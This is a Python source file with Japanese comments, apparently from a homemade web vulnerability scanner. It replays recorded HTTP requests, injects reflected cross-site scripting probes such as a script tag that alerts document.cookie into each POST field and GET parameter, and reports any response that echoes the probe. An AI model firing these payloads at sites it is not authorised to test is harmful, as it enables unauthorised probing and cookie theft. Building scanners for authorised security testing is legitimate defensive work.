from requests_html import HTMLSession
from urllib.parse import unquote
import sqlite3
import method
from time import sleep
import json

# requests_htmlの設定
session = HTMLSession()

# プロキシ設定
proxies = {"http":"http://127.0.0.1:8888"}

# POSTの関数
def POST_request(request_list):
    #url設定
    url = method.url(request_list[0])

    # header設定
    headers = method.headers(request_list)

    # cookies設定
    cookies = method.cookies(request_list[11])

    # request_bodyの設定
    request_body = method.request_body(request_list[12])
    body_list = request_body[0]
    payload = request_body[1]

    #requestbodyが診断できる値か判定
    if(len(body_list)%2!=0):
        return

    # 変数nを設定
    n = 0

    # csspリスト作成
    cssp_list = ['''>"><hr>''',''''>"><script>alert(document.cookie)</script>''','''javascript:alert(document.cookie);''']

    # defacing_payloadを作成
    defacing_payload={}

    # 診断開始
    while(n<len(body_list)):
        # 攻撃開始
        for cssp_n in range(len(cssp_list)):

            # 正規のbodyをコピー
            defacing_payload = payload.copy()

            # body改ざん
            defacing_payload[body_list[n]] = cssp_list[cssp_n]

            # ContentTypeがjsonの場合、型を変更する
            if(request_list[6]=='application/json'):
                defacing_payload = json.dumps(defacing_payload)

            # request送信
            try:
                if(cookies!={}):
                    # cookie有
                    response1 = session.post(url,defacing_payload,headers=headers,cookies=cookies,proxies=proxies)
                else:
                    #cookie無
                    response1 = session.post(url,defacing_payload,headers=headers,proxies=proxies)
            except Exception:
                continue
            sleep(1)

            # ContentTypeがjsonの場合、型を変更する
            if(request_list[6]=='application/json'):
                defacing_payload = json.loads(defacing_payload)

            # レスポンスにcssp_list[cssp_n]が含まれている場合、脆弱性ありと判定
            if(response1.html.search(cssp_list[cssp_n])!=None):
                # logファイルからrequestheader取得
                f = open(r"C:\VulnDiag\nginx\nginx-1.20.1\logs\http.log", 'r+', encoding='UTF-8')
                log = f.readlines()

                # logファイルのリストを降順にする
                log.reverse()

                # logを降順で読み込む
                for line in log:
                    # lineから改行コードを取り除く
                    onelog = line.strip()

                    # log_listを作成
                    log_list = onelog.split('%log%')

                    #HTTPメソッドの確認
                    if("POST" not in log_list[0]):
                        continue

                    # log_payloadの設定
                    request_body = method.request_body(unquote(log_list[12]))
                    log_payload = request_body[1]

                    # cookie_listの設定
                    log_cookie_list = log_list[13].replace('; ','%cookie%').split('%cookie%')
                    request_cookie_list = request_list[11].replace('; ','%cookie%').split('%cookie%')

                    # 対象logか判定
                    if(request_list[0]==log_list[0] and request_cookie_list.sort()==log_cookie_list.sort() and defacing_payload==log_payload):
                        f.truncate(0)
                        break

                # report書き込み準備
                response_list = dict(response1.headers)
                if(cssp_n<2):
                    name = "クロスサイトスクリプティング"+str(cssp_n+1)
                else:
                    name = "クロスサイトスクリプティング"+str(cssp_n+2)

                # レポート出力
                method.report(url,body_list[n],list(log_list),response_list,str(log_list[14]),response1.text,name)

        # 変数nをwhileが周るごとに+2する
        n = n + 2


# GETの関数
def GET_request(request_list):
    # url設定
    url = method.url(request_list[0])

    # header設定
    headers = method.headers(request_list)

    # cookies設定
    cookies = method.cookies(request_list[11])

    # GETmethod_list設定
    getmethod = method.getmethod(url)
    idx = getmethod[0]
    getmethod_list = getmethod[1]

    #getmethodが診断できる値か判定
    if(len(getmethod_list)%2!=0):
        return

    # 変数nを設定
    n = 0

    # csspリスト作成
    cssp_list = [''''>"><hr>''',''''>"><script>alert(document.cookie)</script>''','''javascript:alert(document.cookie);''']

    # 診断開始
    while(n<len(getmethod_list)):
        # 攻撃開始
        for cssp_n in range(len(cssp_list)):
            # 正規のgetmethod_listをコピー
            defacing_getmethod_list = getmethod_list.copy()

            # getmethod改ざん
            defacing_getmethod_list[n+1] = cssp_list[cssp_n]
            defacing_getmethod = '?'
            m = 0
            while(m<len(defacing_getmethod_list)):
                defacing_getmethod += defacing_getmethod_list[m]+'='+defacing_getmethod_list[m+1]
                m = m+2
                if(m<len(defacing_getmethod_list)):
                    defacing_getmethod += '&'

            # request送信
            try:
                if(cookies!={}):
                    # cookie有
                    response1 = session.get(url[:idx]+defacing_getmethod,headers=headers,cookies=cookies,proxies=proxies)
                else:
                    # cookie無
                    response1 = session.get(url[:idx+1]+defacing_getmethod,proxies=proxies)
            except Exception:
                continue
            sleep(1)

            # レスポンスにcssp_list[cssp_n]が含まれている場合、脆弱性ありと判定
            if(response1.html.search(cssp_list[cssp_n])!=None):
                # logファイルからrequestheader取得
                f = open(r"C:\VulnDiag\nginx\nginx-1.20.1\logs\http.log", 'r+', encoding='UTF-8')
                log = f.readlines()

                # logファイルのリストを降順にする
                log.reverse()

                # logを降順で読み込む
                for line in log:
                    # lineの改行コード削除
                    onelog = line.strip()

                    # log_listを作成
                    log_list = onelog.split('%log%')

                    #HTTPメソッドの確認
                    if("GET" not in log_list[0]):
                        continue

                    # log_url設定
                    log_url = method.url(log_list[0])

                    # cookie_listの設定
                    log_cookie_list = log_list[13].replace('; ','%cookie%').split('%cookie%')
                    request_cookie_list = request_list[11].replace('; ','%cookie%').split('%cookie%')

                    # 対象logか判定
                    if(unquote(url[:idx]+defacing_getmethod)==unquote(log_url) and request_cookie_list.sort()==log_cookie_list.sort()):
                        f.truncate(0)
                        break

                # report書き込み準備
                response_list = dict(response1.headers)
                if(cssp_n<2):
                    name = "クロスサイトスクリプティング"+str(cssp_n+1)
                else:
                    name = "クロスサイトスクリプティング"+str(cssp_n+2)

                # レポート出力
                method.report(str(log_url),getmethod_list[n],list(log_list),response_list,str(log_list[14]),response1.text,name)

        # 変数nをwhileが周るごとに+2する
        n = n+2


# メイン
def main():
    # データベース名を設定
    db_name = 'C:/VulnDiag/pg/db_http.db'

    # db_nameのデータベースがなければ作成してから接続する
    con = sqlite3.connect(db_name)

    # sqliteを操作するカーソルオブジェクトを作成
    cur = con.cursor()

    # selectでデータを取り出す
    cur.execute('SELECT DISTINCT First_Row,Host,User_Agent,Accept,Accept_Language,Accept_Encoding,Content_Type,Origin,Connection,Referer,Upgrade_Insecure_Requests,Cookies,Request_Body FROM http WHERE First_Row LIKE "POST%" OR First_Row LIKE "%?%"')
    request_list = cur.fetchall()

    # DB接続終了
    cur.close()
    con.close()

    # リストをwhile
    for n in range(len(request_list)):
        if("POST" in request_list[n][0]):
            POST_request(request_list[n])
        else:
            GET_request(request_list[n])


if __name__ == "__main__":
    main()